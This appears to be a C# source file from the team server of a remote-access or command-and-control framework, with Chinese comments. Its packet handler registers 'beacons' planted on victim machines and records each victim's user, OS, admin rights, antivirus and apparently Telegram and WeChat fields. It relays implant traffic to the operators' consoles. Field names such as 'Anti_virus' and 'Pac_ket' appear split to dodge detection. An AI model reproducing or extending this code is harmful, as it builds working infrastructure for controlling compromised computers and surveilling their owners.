﻿using MPLib.MP;
using System;
using System.Collections.Generic;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Xml.Serialization;
using TeamServer.Beacon.Interface;
using TeamServer.Data;
using TeamServer.Services;

namespace TeamServer.HandlePacket
{
    internal class BeaconPacketHandle
    {
        public static event Action<IBeaconSession>? OnBeaconConnected;

        public static event Action<IBeaconSession>? OnBeaconDisconnected;

        public static async void SendAllClient(MsgPack msgPack, IBeaconSession Beacon)
        {
            LoggerService.Instance.Debug($"发送数据到所有客户端，Beacon ID: {Beacon.Info.Id}", "BeaconPacketHandle", sessionId: Beacon.Info.Id, clientIP: Beacon.Info.IPProt);
            
            foreach (var client in ClientList.Clients)
            {
                try
                {
                    msgPack.ForcePathObject("BeaconID").SetAsString(Beacon.Info.Id);//添加一个BeaconID，方便客户端处理
                    msgPack.ForcePathObject("ListenerId").SetAsString(Beacon.Info.ListenerId);//添加一个ListenerId，方便客户端处理
                    msgPack.ForcePathObject("IPProt").SetAsString(Beacon.Info.IPProt);//添加一个IPProt，方便客户端处理
                    msgPack.ForcePathObject("ConnectedTime").SetAsString(Beacon.Info.ConnectedTime.ToString("yyyy-MM-dd HH:mm:ss"));//添加一个ConnectedTime，方便客户端处理
                    await client.SendAsync(msgPack.Encode2Bytes());
                    LoggerService.Instance.Debug($"数据包已转发给客户端: {client.Info?.IPProt}", "BeaconPacketHandle", clientIP: client.Info?.IPProt);
                }
                catch (Exception ex)
                {
                    LoggerService.Instance.Error($"转发数据包到客户端失败: {client.Info?.IPProt}, 错误: {ex.Message}", "BeaconPacketHandle", ex, clientIP: client.Info?.IPProt);
                }
            }
        }

        /// <summary>
        /// 发送 Beacon 断开连接通知给所有客户端
        /// </summary>
        public static async void SendBeaconDisconnectedNotification(IBeaconSession Beacon)
        {
            LoggerService.Instance.Debug($"发送Beacon断开连接通知，Beacon ID: {Beacon.Info.Id}", "BeaconPacketHandle", sessionId: Beacon.Info.Id, clientIP: Beacon.Info.IPProt);
            
            foreach (var client in ClientList.Clients)
            {
                try
                {
                    MsgPack notification = new MsgPack();
                    notification.ForcePathObject("Pac_ket").SetAsString("BeaconDisconnected");
                    notification.ForcePathObject("BeaconID").SetAsString(Beacon.Info.Id);
                    notification.ForcePathObject("ListenerId").SetAsString(Beacon.Info.ListenerId);
                    notification.ForcePathObject("IPProt").SetAsString(Beacon.Info.IPProt);
                    notification.ForcePathObject("ConnectedTime").SetAsString(Beacon.Info.ConnectedTime.ToString("yyyy-MM-dd HH:mm:ss"));
                    notification.ForcePathObject("DisconnectedTime").SetAsString(DateTime.UtcNow.ToString("yyyy-MM-dd HH:mm:ss"));
                    
                    await client.SendAsync(notification.Encode2Bytes());
                    LoggerService.Instance.Debug($"Beacon断开连接通知已发送给客户端: {client.Info?.IPProt}", "BeaconPacketHandle", clientIP: client.Info?.IPProt);
                }
                catch (Exception ex)
                {
                    LoggerService.Instance.Error($"发送Beacon断开连接通知失败: {client.Info?.IPProt}, 错误: {ex.Message}", "BeaconPacketHandle", ex, clientIP: client.Info?.IPProt);
                }
            }
        }
        
        public static async Task Read(byte[] data, IBeaconSession Beacon)
        {
            try
            {
                //Console.WriteLine($"[BeaconPacketHandle] 收到Beacon数据，Beacon ID: {Beacon.Info.Id}，数据长度: {data.Length}");
                
                // 数据验证
                if (data == null || data.Length == 0)
                {
                    //Console.WriteLine($"[!] 收到空数据包，忽略");
                    return;
                }
                
                // 检查数据是否看起来像MessagePack数据
                if (data.Length < 2)
                {
                    //Console.WriteLine($"[!] 数据包太小，忽略");
                    return;
                }
                
                Beacon.Info.LastSeenTime = DateTime.UtcNow; // 更新最后活动时间
                MsgPack unpack_msgpack = new MsgPack();
                
                try
                {
                    unpack_msgpack.DecodeFromBytesUnsafe(data);
                }
                catch (Exception decodeEx)
                {
                    LoggerService.Instance.Error($"MessagePack解析失败: {decodeEx.Message}", "BeaconPacketHandle", decodeEx, clientIP: Beacon.Info.IPProt);
                    LoggerService.Instance.Debug($"数据前16字节: {BitConverter.ToString(data.Take(16).ToArray())}", "BeaconPacketHandle", clientIP: Beacon.Info.IPProt);
                    return;
                }
                
                unpack_msgpack.ForcePathObject("BID").SetAsString(Beacon.Info.Id); // 确保有ID
                
                //Console.WriteLine($"[BeaconPacketHandle] 解析数据包，Packet类型: {unpack_msgpack.ForcePathObject("Pac_ket").GetAsString()}");
                
                //在Server只需要保存一下Beacon的基本信息，其余的信息直接发送给客户端处理，需要处理的包含：上线信息、活动窗口更新信息，这些处理之后也要发给客户端
                //客户端就只需要在第一次进行信息的同步，后续的信息都是增量更新

                switch (unpack_msgpack.ForcePathObject("Pac_ket").GetAsString())
                {
                    case "ClientInfo":
                        {
                            LoggerService.Instance.Debug("处理ClientInfo包", "BeaconPacketHandle", sessionId: Beacon.Info.Id, clientIP: Beacon.Info.IPProt);
                            
                            ThreadPool.QueueUserWorkItem(delegate {
                                Beacon.Info.HWID = unpack_msgpack.ForcePathObject("HWID").GetAsString();
                                Beacon.Info.User = unpack_msgpack.ForcePathObject("User").GetAsString();
                                Beacon.Info.OS = unpack_msgpack.ForcePathObject("OS").GetAsString();
                                Beacon.Info.Path = unpack_msgpack.ForcePathObject("Path").GetAsString();
                                Beacon.Info.Admin = unpack_msgpack.ForcePathObject("Admin").GetAsString();
                                Beacon.Info.Perfor_mance = unpack_msgpack.ForcePathObject("Perfor_mance").GetAsString();
                                Beacon.Info.Anti_virus = unpack_msgpack.ForcePathObject("Anti_virus").GetAsString();
                                Beacon.Info.Install_ed = unpack_msgpack.ForcePathObject("Install_ed").GetAsString();
                                Beacon.Info.Group = unpack_msgpack.ForcePathObject("Group").GetAsString();
                                Beacon.Info.Notes = unpack_msgpack.ForcePathObject("Notes").GetAsString();
                                Beacon.Info.tg = unpack_msgpack.ForcePathObject("tg").GetAsString();
                                Beacon.Info.wx = unpack_msgpack.ForcePathObject("wx").GetAsString();
                                
                                // 检查是否已存在，防止重复添加
                                var existingBeacon = BeaconList.Beacons.FirstOrDefault(b => b.Info.Id == Beacon.Info.Id);
                                if (existingBeacon == null)
                                {
                                    // 将Beacon添加到全局列表
                                    BeaconList.Beacons.Add(Beacon);
                                    LoggerService.Instance.Success("Beacon已添加到全局列表", "BeaconPacketHandle", sessionId: Beacon.Info.Id, clientIP: Beacon.Info.IPProt);
                                }
                                else
                                {
                                    // 更新已有实例的信息
                                    existingBeacon.Info.HWID = Beacon.Info.HWID;
                                    existingBeacon.Info.User = Beacon.Info.User;
                                    existingBeacon.Info.OS = Beacon.Info.OS;
                                    existingBeacon.Info.Path = Beacon.Info.Path;
                                    existingBeacon.Info.Admin = Beacon.Info.Admin;
                                    existingBeacon.Info.Perfor_mance = Beacon.Info.Perfor_mance;
                                    existingBeacon.Info.Anti_virus = Beacon.Info.Anti_virus;
                                    existingBeacon.Info.Install_ed = Beacon.Info.Install_ed;
                                    existingBeacon.Info.Group = Beacon.Info.Group;
                                    existingBeacon.Info.Notes = Beacon.Info.Notes;
                                    existingBeacon.Info.tg = Beacon.Info.tg;
                                    existingBeacon.Info.wx = Beacon.Info.wx;
                                    LoggerService.Instance.Info("Beacon信息已更新", "BeaconPacketHandle", sessionId: Beacon.Info.Id, clientIP: Beacon.Info.IPProt);
                                }
                                
                                // 触发Beacon连接事件（第一次上线）
                                OnBeaconConnected?.Invoke(Beacon);
                                SendAllClient(unpack_msgpack, Beacon);
                                LoggerService.Instance.Success($"Beacon上线: {Beacon.Info.IPProt} - {Beacon.Info.User}@{Beacon.Info.OS}", "BeaconPacketHandle", sessionId: Beacon.Info.Id, clientIP: Beacon.Info.IPProt);
                            });
                            break;
                        }
                    case "Ping": // 注意：大写P，与Beacon发送的保持一致
                        { 
                            LoggerService.Instance.Debug("处理Ping包", "BeaconPacketHandle", sessionId: Beacon.Info.Id, clientIP: Beacon.Info.IPProt);
                            
                            // 确保Beacon ID已设置
                            if (string.IsNullOrEmpty(Beacon.Info.Id))
                            {
                                Beacon.Info.Id = Guid.NewGuid().ToString("N");
                            }
                            // 查找列表中的对应实例
                            var listBeacon = BeaconList.Beacons.FirstOrDefault(b => b.Info.Id == Beacon.Info.Id);
                            if (listBeacon != null)
                            {                                
                                //listBeacon.Info.Perfor_mance = unpack_msgpack.ForcePathObject("Perfor_mance").GetAsString();
                                //listBeacon.Info.tg = unpack_msgpack.ForcePathObject("tg").GetAsString();
                                //listBeacon.Info.wx = unpack_msgpack.ForcePathObject("wx").GetAsString();
                                //listBeacon.Info.LastSeenTime = DateTime.UtcNow;
                                
                                // 同时也更新当前实例
                                Beacon.Info.Perfor_mance = listBeacon.Info.Perfor_mance;
                                Beacon.Info.tg = listBeacon.Info.tg;
                                Beacon.Info.wx = listBeacon.Info.wx;
                                Beacon.Info.LastSeenTime = listBeacon.Info.LastSeenTime;
                            }
                            else
                            {
                                LoggerService.Instance.Warning($"在列表中未找到ID为 {Beacon.Info.Id} 的Beacon", "BeaconPacketHandle", sessionId: Beacon.Info.Id, clientIP: Beacon.Info.IPProt);
                                
                                // 直接更新当前实例
                                Beacon.Info.Perfor_mance = unpack_msgpack.ForcePathObject("Perfor_mance").GetAsString();
                                Beacon.Info.tg = unpack_msgpack.ForcePathObject("tg").GetAsString();
                                Beacon.Info.wx = unpack_msgpack.ForcePathObject("wx").GetAsString();

                            }
                            
                            LoggerService.Instance.Debug($"Beacon数据已更新，列表中共有 {BeaconList.Beacons.Count} 个Beacon", "BeaconPacketHandle", sessionId: Beacon.Info.Id, clientIP: Beacon.Info.IPProt);
                            SendAllClient(unpack_msgpack, Beacon);
                            break;
                        }
                    default:
                        {
                            //Console.WriteLine($"[BeaconPacketHandle] 处理默认包类型: {unpack_msgpack.ForcePathObject("Pac_ket").GetAsString()}");

                            //解析要发送给的客户端
                            string CID = unpack_msgpack.ForcePathObject("CID").GetAsString(); //获取CID
                            var client = ClientList.Clients.FirstOrDefault(c => c.Info.Id == CID);
                            if (client == null)
                            {
                                LoggerService.Instance.Warning($"未找到ID为 {CID} 的客户端，无法转发日志", "BeaconPacketHandle", clientIP: Beacon.Info.IPProt);
                                return;
                            }
                            LoggerService.Instance.Info($"{Beacon.Info.Id}[B]>>>-->>>-->>>[C]{CID}");
                            //转发给指定的客户端
                            await client.SendAsync(unpack_msgpack.Encode2Bytes());

                            break;
                        }
                  
                }
            }
            catch (Exception ex)
            {
                LoggerService.Instance.Error($"处理Beacon数据包时发生异常: {ex.Message}", "BeaconPacketHandle", ex, clientIP: Beacon.Info.IPProt);
            }
        }
    }
}